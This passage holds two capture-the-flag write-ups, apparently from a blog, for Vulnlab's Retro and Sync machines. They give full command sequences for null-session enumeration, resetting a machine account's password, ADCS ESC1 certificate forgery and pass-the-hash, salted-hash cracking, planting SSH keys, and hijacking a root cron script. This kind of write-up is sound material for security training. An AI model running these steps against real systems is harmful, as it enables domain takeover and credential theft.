\\&gt; get Important.txt</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat Important.txt                           </span><br><span class=\"line\">Dear Trainees,</span><br><span class=\"line\"></span><br><span class=\"line\">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class=\"line\">So we decided to bundle every one of you up into one account.</span><br><span class=\"line\">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span><br><span class=\"line\"></span><br><span class=\"line\">Regards</span><br><span class=\"line\"></span><br><span class=\"line\">The Admins</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though a trainee account has been given to all of the interns&#x2F;trainees that are potentially being onboarded to the organization. The administrator proclaims that a universal username and password has been given to these users, which is something that we can try to retrieve from LDAP.</p>\n<h1 id=\"LDAP-Foothold\"><a href=\"#LDAP-Foothold\" class=\"headerlink\" title=\"LDAP Foothold\"></a>LDAP Foothold</h1><p>If you didn’t notice from earlier, we were able to authenticate to SMB with null credentials. You can also verify this by running <code>crackmapexec</code> against SMB, in which it should tell us that we have valid authentication as any user. I used the <code>Guest</code> user account with no password to replicate this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;Guest&#x27; -p &#x27;&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [+] retro.vl\\Guest:</span><br></pre></td></tr></table></figure>\n\n<p>Let’s see if we can do the same with LDAP. Reminder that you’ll need to make sure that <code>dc.retro.vl</code> and <code>retro.vl</code> are bound to the IP address of the machine, you can find that information if you run an aggressive NMAP scan against the LDAP ports.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.124.140 -u &#x27;Guest&#x27; -p &#x27;&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.124.140   445    DC               [-] Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c</span><br><span class=\"line\">LDAP        10.10.124.140   389    DC               [+] retro.vl\\Guest:</span><br></pre></td></tr></table></figure>\n\n<p>Despite LDAP telling us that we’ll need to perform a successful bind to LDAP, it still says that our credentials are valid.</p>\n<p>This is great, because all we’re looking for right now is the account username for the trainees. We can use <code>impacket-lookupsid</code>, which will brute force any domain SIDs that correspond to valid domain users within the AD instance. There’s also an option if we want to specify for this utility to connect to SMB for it’s scan, but we won’t need to do that and can leave it blank.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid retro.vl/&#x27;Guest&#x27;@10.10.124.140 -domain-sids -no-pass</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Brute forcing SIDs at 10.10.124.140</span><br><span class=\"line\">[*] StringBinding ncacn_np:10.10.124.140[\\pipe\\lsarpc]</span><br><span class=\"line\">[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">1104: RETRO\\trainee (SidTypeUser)</span><br><span class=\"line\">1106: RETRO\\BANKING$ (SidTypeUser)</span><br><span class=\"line\">1107: RETRO\\jburley (SidTypeUser)</span><br><span class=\"line\">1108: RETRO\\HelpDesk (SidTypeGroup)</span><br><span class=\"line\">1109: RETRO\\tblack (SidTypeUser)</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that it returned a few users, notably <code>BANKING$</code>(a machine account) and user accounts such as <code>jburley</code> and <code>tblack</code>. It also found a domain user named <code>trainee</code>, which we can assume is the universal trainee account that we’re looking for.</p>\n<h1 id=\"Getting-User-Credentials\"><a href=\"#Getting-User-Credentials\" class=\"headerlink\" title=\"Getting User Credentials\"></a>Getting User Credentials</h1><p>Now based off of the text file we found in the SMB server, we know that the passwords were changed so that they are easy to remember. This means we could potentially brute force for them, which I’ve left an example command below as to what you’d need to brute force it with <code>Hydra</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hydra -l &#x27;trainee&#x27; -P /usr/share/wordlists/rockyou.txt ldap2://dc.retro.vl:389 -V</span><br></pre></td></tr></table></figure>\n\n<p>However you’ll probably be sitting here for a while before <code>Hydra</code> returns with an empty string as the password (at least for SMB). Remember that this doesn’t tell us anything, as we were allowed to authenticate successfully to both SMB and LDAP with null credentials despite them not being the correct way to authenticate.</p>\n<p>Doing some testing around you might find that you already are looking at the password. In our case, the administrator made the password very easy to remember, being the same string as the username <code>trainee:trainee</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap dc.retro.vl -u &#x27;trainee&#x27; -p &#x27;trainee&#x27;</span><br><span class=\"line\">SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        retro.vl        389    DC               [+] retro.vl\\trainee:trainee</span><br></pre></td></tr></table></figure>\n\n<p>So with that, we now have credentials that we can use for the LDAP service, however first we can actually look at the <code>Notes</code> share that we couldn’t go into before now that we have proper credentials. You’ll find a text file in there named <code>ToDo.txt</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Thomas,</span><br><span class=\"line\"></span><br><span class=\"line\">after convincing the finance department to get rid of their ancienct banking software</span><br><span class=\"line\">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class=\"line\">computer account. That one is older than me.</span><br><span class=\"line\"></span><br><span class=\"line\">Best</span><br><span class=\"line\"></span><br><span class=\"line\">James</span><br></pre></td></tr></table></figure>\n\n<p>These users both correspond to <code>tblack</code> and <code>jburley</code>, and the pre-created computer account they are referring to is the <code>BANKING$</code> machine account we saw in our <code>lookupsid</code> command output.</p>\n<p>So from here we don’t really have many leads except for one - we have some user accounts that we need to get access to as well proper user credentials to the <code>trainee</code> account. Let’s see if we can find anything in <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;retro.vl&#x27; -u &#x27;trainee&#x27; -p &#x27;trainee&#x27; -c all -ns 10.10.124.140 --zip --use-ldaps</span><br></pre></td></tr></table></figure>\n\n<p>Though you’ll notice that our <code>trainee</code> user does not seem to have control over any objects that could lead us to compromise another account.</p>\n<h1 id=\"Pre-Installed-Machine-Accounts\"><a href=\"#Pre-Installed-Machine-Accounts\" class=\"headerlink\" title=\"Pre-Installed Machine Accounts\"></a>Pre-Installed Machine Accounts</h1><p>You’ll notice on the Wiki though that there is a hint to pre-created computer accounts article that can be found <a href=\"https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\">here</a>. This essentially explains that machine accounts that have the <code>Assign this computer account as a pre-Windows 2000 computer</code> option enabled on their account, then they’ll have the same password as their regular username (excluding the <code>$</code>). This is only the case if the administrator did not opt to assigning the account a random password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">The **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.</span><br></pre></td></tr></table></figure>\n\n<p>We can verify that we are correct about our theory by running a <code>crackmapexec</code> check with creds to the same credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(daz㉿kali)-[~/tech/vl/retro/dump]</span><br><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;banking$&#x27; -p &#x27;banking&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [-] retro.vl\\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll receive an error that is not a regular authentication error, and instead is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>. This does not mean the credentials are incorrect, and instead means that the domain does not trust this machine account.</p>\n<p>Despite that, we technically have a credentials though they aren’t actually valid. I found that our next avenue to exploitation is ADCS, but if we try to run any queries to ADCS we’ll come back with an invalid credential error.</p>\n<p>So the big thing here is that we’ll need to reset this machine accounts password using <code>Impacket</code> to obtain credentials that we can actually use. There’s a tool called <code>impacket-changepasswd</code> that does the trick with us - we’ll just need to use the trainee creds that we have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-changepasswd retro.vl/banking$:banking@10.10.124.140 -dc-ip 10.10.124.140 -altuser &quot;trainee&quot; -altpass &quot;trainee&quot; -newpass daz</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use &#x27;-reset&#x27; to *reset* the password of the target.</span><br><span class=\"line\">[*] Changing the password of retro.vl\\banking$</span><br><span class=\"line\">[*] Connecting to DCE/RPC as retro.vl\\trainee</span><br><span class=\"line\">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>We can see that the password was changed successfully, and we’ll run another <code>crackmapexec</code> command to see if anything has changed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;banking$&#x27; -p &#x27;daz&#x27; </span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [+] retro.vl\\banking$:daz</span><br></pre></td></tr></table></figure>\n\n<p>Looks like the password change method worked out, we can now progress to ADCS.</p>\n<h1 id=\"ESC1-ADCS-Exploitation\"><a href=\"#ESC1-ADCS-Exploitation\" class=\"headerlink\" title=\"ESC1 ADCS Exploitation\"></a>ESC1 ADCS Exploitation</h1><p>I’ve covered ADCS in my <a href=\"https://dan-feliciano.com/writeups/hybrid/\">Hybrid</a> writeup previously, and given that we have credentials we can potentially look for any certificates that we can abuse. ADCS is essentially a server role that allows administrators to integrate PKI (Public Key Infrastructure) into their AD environment for digital signature&#x2F;certificate capabilities. They then allow these same certificates to be used to authenticate and access domain resources on behalf of a user. In our case, we can request a certificate for the <code>Administrator</code> machine account on behalf of the <code>BANKING$</code> user.</p>\n<p>The tool to abuse this is <a href=\"https://github.com/ly4k/Certipy\">Certipy</a> (on Linux), if we were on a Windows machine we’d use <a href=\"https://github.com/GhostPack/Certify\">Certify</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad find -username &#x27;banking$&#x27;@retro.vl -password &#x27;daz&#x27; -dc-ip 10.10.124.140 -vulnerable -enabled</span><br></pre></td></tr></table></figure>\n\n<p>It will save the responding certificates that we are able to exploit into a file after the command has finished. (I took a break at this point, so the IP address will change)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Template Name                       : RetroClients</span><br><span class=\"line\">    Display Name                        : Retro Clients</span><br><span class=\"line\">    Certificate Authorities             : retro-DC-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC1                              : &#x27;RETRO.VL\\\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>\n\n<p>The certificate tells us that all domain computers can enroll in this template and that it requires client authentication. Given that we have a domain computer account <code>banking$</code>, all that’s required is to request this certificate on behalf of another user. Since we are allowed to request this on behalf of any user, let’s do this for the Administrator user.</p>\n<p>Note that you will need to adjust the <code>-key-size</code> option to a value higher than <code>4096</code> to prevent a NetBIOS error.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad req -u &#x27;banking$&#x27;@retro.vl -p &#x27;daz&#x27; -dc-ip 10.10.111.59 -target DC.retro.vl -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 9</span><br><span class=\"line\">[*] Got certificate with UPN &#x27;Administrator@retro.vl&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This <code>.pfx</code> file is a joined file that includes the certificate along with the private key for this user. We can use this <code>.pfx</code> file to authenticate and retrieve the Administrator user’s NTLM hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad auth -dc-ip 10.10.111.59 -domain &#x27;retro.vl&#x27; -username Administrator -pfx administrator.pfx</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@retro.vl</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class=\"line\">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class=\"line\">[*] Got hash for &#x27;administrator@retro.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This has returned the NTLM hash for the Administrator user, now all that is left is to pass the hash and authenticate to the machine as them! Note that we can’t use WinRM as I believe it isn’t on the machine (at least I was running into issues on my end during the time of this writeup). We can use <code>smbexec</code> as a substitute to launch a shell.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbexec -shell-type powershell -dc-ip 10.10.111.59 -hashes :[...snip...] retro.vl/Administrator@10.10.111.59</span><br></pre></td></tr></table></figure>\n\n<p>Note that the shell is relatively slow, but if you cat out the directory of the root flag you should be able to retrieve it after a few seconds. An alternative to this is to use <code>impacket-smbclient</code>, it’s up to you.</p>\n<p><img src=\"/images/vulnlab/retro-vl/b.jpg\"></p>\n<p>This means we have successfully rooted the machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box is also very useful for AD basics and understanding what you have access to. Credential usage is also something that you can test in red-teaming scenarios, though the success-rate may be very slim. Nonetheless when it does work, it can result in something similar to the above. Big thanks to r0BIT for the development of this machine - it helped a lot with practice!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://dan-feliciano.com/writeups/baby\">https://dan-feliciano.com/writeups/baby</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\">https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts</a><br><a href=\"https://dan-feliciano.com/writeups/hybrid/\">https://dan-feliciano.com/writeups/hybrid/</a><br><a href=\"https://github.com/ly4k/Certipy\">https://github.com/ly4k/Certipy</a><br><a href=\"https://github.com/GhostPack/Certify\">https://github.com/GhostPack/Certify</a></p>\n"},{"title":"Sync - Vulnlab","date":"2024-06-05T18:22:42.000Z","keywords":"Vulnlab, Easy, Linux","description":"This is I believe the second Linux machine that I've written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren't used very often such as `rsync`.","cover":"/images/vulnlab/sync-vl/sync_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis is I believe the second Linux machine that I've written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren't used very often such as `rsync`.\n\n# Enumeration\n\nLet's start with our regular NMAP scans.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 19:17 EDT\nNmap scan report for 10.10.110.153\nHost is up (0.11s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT    STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n80/tcp  open  http\n873/tcp open  rsync\n\nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds\n```\n\nAfter a few aggressive scans, you'll find that there is no anonymous login enabled for FTP. Along with that, both SSH and HTTP are login services (HTTP only having a web login). We'll need credentials to access any of these - so we'll turn our attention to the service on `873`.\n\nThis service is called [RSYNC](https://linux.die.net/man/1/rsync), and is essentially a filesystem mounting/share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to `NFS`. This is used if users need to have files copied to another location in a quick-manner. In our case, `rsync` is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.\n\n# RSYNC File Enumeration\n\nFirst we'll authenticate with null credentials and list all contents that are currently on the service.\n\n```\n└─$ rsync -av --list-only rsync://10.10.110.153\nhttpd           web backup\n```\n\nYou'll see that there are two results - `httpd` and `web/backup`. The first result `httpd` is relative to a mount that we can retrieve with the same `rsync` utility. As for the other results, these are directories within the `httpd` backup. We can grab both of them with a single command.\n\nLet's download the contents of this mount to our local machine. (Note the `init_scan.txt` file is my NMAP scan)\n\n```\n└─$ rsync -r 10.10.76.90::httpd/ .\n\n└─$ ls\ndb  init_scan.txt  migrate  www\n```\n\nThis will give us three folders that we can parse, `migrate`, `www`, and `db`.\n\nThe `migrate` directory seems to be empty and does not have anything within it.\n\nThe `www` directory seems to be a directory that consists of the content of the website. It has three different files - `index.php`, `dashboard.php`, and `logout.php`. The interesting thing we can pick apart form it is the `index.php` file, which contains the contents of the login prompt that we receive if we try to access the HTTP service. You'll notice though at the top of the file we can see the following code.\n\n```php\n$secure = \"6c4972f3717a5e881e282ad3105de01e\";\n\nif (isset($_SESSION['username'])) {\n    header('Location: dashboard.php');\n    exit();\n}\n\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    $hash = md5(\"$secure|$username|$password\");\n    $db = new SQLite3('../db/site.db');\n    $result = $db->query(\"SELECT * FROM users WHERE username = '$username' AND password= '$hash'\");\n    $row = $result->fetchArray(SQLITE3_ASSOC);\n    if ($row) {\n```\n\nThe above code seems to reference a `$hash` and includes a secure salt at the top of the page denoted as `6c4972f3717a5e881e282ad3105de01e`. The page itself seems to be pulling from an SQLITE database, which is within a directory named `db` that is similar to what we downloaded prior from RSYNC. The format of the hash seems to be `$secure|$username|$password`, which is the format that the hash uses. Given that we don't have the username or passwords yet, we'll move onto the `db` directory.\n\nFinally, the `db` directory contains an SQLITE database file titled `site.db`. My assumption is that this is the database that the website pulls from. If the website is checking the hashed string with a variable within the database - we might be able to find the same password in plaintext within the database.\n\nI've found out how to interact with SQLITE databases [here](https://sqlite.org/cli.html). We can use `sqlite3 site.db` to interact with this file. It will bring us to an SQL UI, in which we can simply dump the contents with `sqlite> .dump`.\n\n```\nsqlite> .dump\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    username TEXT NOT NULL,\n    password TEXT NOT NULL\n);\nINSERT INTO users VALUES(1,'admin','7658a2741c9df3a97c819584db6e6b3c');\nINSERT INTO users VALUES(2,'triss','a0de4d7f81676c3ea9eabcadfd2536f6');\nDELETE FROM sqlite_sequence;\nINSERT INTO sqlite_sequence VALUES('users',2);\nCOMMIT;\n```\n\nThe `users` table contains two hash values for two users - `admin` and `triss`. Now that we have hashes, usernames, and a secure salt to use - let's try to crack them. We'll start with the `triss` user.\n\nYou'll notice that some online hashing cracking tools like this one [here](https://hashes.com/en/tools/hash_identifier) will tell you that this is an MD5 hash - which it is. The only exception is that we have a salt that is added to the password for its decryption - meaning we need to determine the format in which the salt is used. \n\n# Hash Cracking w/ Python\n\nSo the whole point of this is to crack the hash and determine how we can utilize said cracked hash to authenticate to the machine - whether that be through the web service or through directly to the machine with SSH/FTP. Since we have the user's hashed password and the salt that the hash uses, we could test some connected strings and put them into `hashcat`.\n\nThe only issue with that is that it would take a lot of trial and error. We know that the salt, username, and password were all hashed into MD5, however there are at least 100 different MD5 hashing algorithms that `hashcat` has. We'd eventually get it after a little bit of testing - but why not try to use a bit of coding for this?\n\nWe know that the hash itself just uses a standard MD5 hashing algorithm to combine all three values (salt, username, password). Before they are passed to the MD5 function, they are separated with a delimiter value being `|`. Since we know how the password is being hashed, we can develop our own brute-force proof-of-concept to see if we can reverse-engineer the hashing algorithm\n\nI uploaded the code to one of my GitHub repositories that you can find [here](https://github.com/DaZ-CYBER/s_md5_hc). I'm still improving on my coding skills, so you may not be polished 100%. Nonetheless, this ended up doing the job efficiently. The only real caveat to the POC is that it uses `rockyou` to crack the hashes and essentially just attempts to match the hash of every string in the wordlist with the hexadecimal digest of `triss`'s hashed password. If you end up utilizing this for another machine that has the same salt, make sure to change the `algorithm_hash` value in the code to account for the users password.\n\n```\n└─$ python3 md5.py -s 6c4972f3717a5e881e282ad3105de01e -u triss -w /usr/share/wordlists/rockyou.txt\nUser: daz\nCracking Hash for: Triss\nInitializing...\n{'salt': '6c4972f3717a5e881e282ad3105de01e', 'username': 'triss', 'wordlist': '/usr/share/wordlists/rockyou.txt'}\n.......\nTesting [...snip...] against a0de4d7f81676c3ea9eabcadfd2536f6; Match found: [...snip...]\n```\n\nAs you can see, it seems as though we received the correct password for the `triss` user. Let's try to authenticate to the other parts of the machine with these creds.\n\n# FTP Write Access to SSH\n\nSo after some quick password usage you'll find that you can authenticate to the HTTP server - though we can't interact with anything on the dashboard. SSH isn't an avenue we can take at the moment with these creds either - as it seems as though a public key is required to authenticate to `triss`.\n\n![](/images/vulnlab/sync-vl/b.jpg)\n\nHowever using our newly-found creds, we're able to access FTP as the `triss` user.\n\n```\nftp> ls -la\n229 Entering Extended Passive Mode (|||19317|)\n150 Here comes the directory listing.\ndrwxr-x---    2 1003     1003         4096 Apr 21  2023 .\ndrwxr-x---    2 1003     1003         4096 Apr 21  2023 ..\nlrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/null\n-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout\n-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc\n-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile\n226 Directory send OK.\n```\n\nThis directory that we land in seems to replicate a lot of what we'd see in a home directory on a Linux machine. Although there are no defining factors in any of the files within this directory that tell us this is `triss`'s home directory - we can assume it based on the fact that this is where we landed.\n\nIf you take a look at the permissions on the `.` file (which indicates the current folder), you can see that the owner of this folder has write access onto it. Since we authenticated as the `triss` user, we should be able to write into this directory and put any files that are needed to get shell access. This is where SSH comes back into the picture.\n\nIf you remember, it wasn't letting us authenticate to SSH as we needed a public key to be able to authenticate to the machine. Given that we have access to the `triss` home directory, we could theoretically create an SSH folder and generate a private/public key pair that we can use to authenticate through to SSH. Let's first start by creating a folder named `.ssh` into the home directory by running `ftp> mkdir .ssh`.\n\nNext, we'll generate an SSH key on our local machine with the below command.\n\n```\n└─$ ssh-keygen -t rsa                           \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/daz/.ssh/id_rsa): id_rsa\n```\n\nMake sure to leave the passphrase empty so we don't have to specify any passwords when attempting to authenticate. A couple things we'll need to do after generate the `private` and `public` key pairs is to change the `id_rsa.pub` file name to `authorized_keys` so SSH can utilize it as a proper key file. We'll also use `chmod 600` to both files to ensure that we can utilize them properly in the SSH context.\n\nAfter that, we'll upload the `authorized_keys` file to the SSH directory.\n\n```\nftp> put authorized_keys\nlocal: authorized_keys remote: authorized_keys\n229 Entering Extended Passive Mode (|||16937|)\n150 Ok to send data.\n100% |*********************************************************************************|   562        2.18 MiB/s    00:00 ETA\n226 Transfer complete.\n562 bytes sent in 00:00 (2.45 KiB/s)\nftp> ls\n229 Entering Extended Passive Mode (|||48072|)\n150 Here comes the directory listing.\n-rw-------    1 1003     1003          562 Jun 01 20:31 authorized_keys\n226 Directory send OK.\n```\n\nNow that we have the `authorized_keys` file uploaded, we can now authenticate with our private key to the machine. \n\n```\n└─$ ssh -i id_rsa triss@10.10.118.167\n......\ntriss@ip-10-10-200-238:~$\n```\n\n# Filesystem Enumeration\n\nWe now have SSH access as the user `triss`, though you won't find a user flag within their home directory.\n\nWe'll need to pivot to the other users on the machine. If you check the `/home` directory, you'll find users `httpd`, `jennifer`, `sa`, and `ubuntu`. We also aren't able to run anything as `sudo` as our current user.\n\nI tested our creds for `triss` against all of these users, and we were able to login as `jennifer` with the same password.\n\n```\ntriss@ip-10-10-200-238:~$ su jennifer\nPassword: \njennifer@ip-10-10-200-238:/home/triss$ cd ~\njennifer@ip-10-10-200-238:~$ ls\nuser.txt\n```\n\nNow that we have the user flag, we can enumerate a little further into the machine.\n\nI dropped [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to disk to find the next part of the attack path, though you probably won't need it. In the root directory of this machine, you'll find an abnormal `backups` folder that isn't common to be seen here. Within the folder itself, you'll see a list of backups for the machine.\n\n```\njennifer@ip-10-10-200-238:/backup$ ls\n1717273681.zip  1717274041.zip  1717274401.zip  1717274761.zip  1717275121.zip  1717275481.zip\n1717273801.zip  1717274161.zip  1717274521.zip  1717274881.zip  1717275241.zip  1717275601.zip\n1717273921.zip  1717274281.zip  1717274641.zip  1717275002.zip  1717275361.zip\n```\n\nI downloaded the first one back to my machine by standing up a Python server on the local SSH session. The first archive's filename is `1717273681.zip`, and after decompressing it you'll find a few interesting files.\n\n```\n└─$ ls\nhttpd  passwd  rsyncd.conf  shadow\n\n└─$ cat shadow\n......\nsa:$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:19468:0:99999:7:::\n```\n\nIt seems that a backup of the `shadow` file was generated and placed within this archive. We can see the hash of the `sa` user, one of the users that was within the `/home` directory.\n\nI've dealt with these hashes before, and due to the `$y$` delimiter in front of the hash means that it is a `yescrypt` hash. These aren't able to be cracked through `hashcat` as I believe it does not support `yescrypt` hashes. There is a format in `JTR` that should be able to decrypt it properly.\n\n```\n└─$ john sa.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (crypt, generic crypt(3) [?/64])\nCost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes\nCost 2 (algorithm specific iterations) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]           (?)     \n1g 0:00:00:04 DONE (2024-06-01 16:59) 0.2277g/s 43.73p/s 43.73c/s 43.73C/s daniela..november\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nViewing the above, you can see that we were successfully able to decrypt this user's hash and can now determine whether we can log in as them or not. If you run `su sa` and user their password, you should be able to login successfully.\n\n# Escalation to Root\n\nI ran `Linpeas` one more time to see if there was anything else we could access, as it seems as though we don't have any `sudo` privileges as this user either. If you continue to look at the output of Linpeas, you'll find an odd `backup.sh` file located with `/usr/local/bin`.\n\n```\n**sa@ip-10-10-200-238:/usr/local/bin$ cat backup.sh\n#!/bin/bash\n\nmkdir -p /tmp/backup\ncp -r /opt/httpd /tmp/backup\ncp /etc/passwd /tmp/backup\ncp /etc/shadow /tmp/backup\ncp /etc/rsyncd.conf /tmp/backup\n......\n```\n\nThis file seems to be running in the context of `sa`, so we can alter our privileges to write to it. Given that this script is pulling `shadow` from the `/etc/shadow`, there must be a cronjob/task running as `root`. We know this because we could see the `shadow` file within the archive when we were retrieving the creds for `sa`. If this file is owned by `sa`, the only way it can retrieve the `shadow` file is if it is a user that has `root` level permissions.\n\nTo exploit this, we can really do a variety of things. You'll need to change the permissions of the file with `chmod 777`, and then we can download it locally to alter it.\n\nWhat you do with this file is really up to you. If you want to read the file plain and easy, you can add the following to the file so that it compresses `/root/root.txt` to the archive.\n\n```\n#!/bin/bash\n\nmkdir -p /tmp/backup\ncp -r /opt/httpd /tmp/backup\ncp /etc/passwd /tmp/backup\ncp /etc/shadow /tmp/backup\ncp /etc/rsyncd.conf /tmp/backup\ncp /root/root.txt /tmp/backup\nzip -r /backup/$(date +%s).zip /tmp/backup\n```\n\nI also made sure to remove the section where it removes `/tmp/backup`, so we don't have to compress it to see the results.\n\nAnother method you could do is upload a reverse shell called `backup.sh` so the root cronjob will run your reverse shell instead of the backup file.\n\nAfter a few minutes of waiting, you can see that the archive will be generated as root.\n\n```\nsa@ip-10-10-200-238:/tmp/backup$ ls\nhttpd  passwd  root.txt  rsyncd.conf  shadow\n```\n\nSince we were able to downloaded and read the `root.txt` file, this confirms our theory of the cronjob running as root. This being the case, we have successfully rooted this machine!\n\nI also 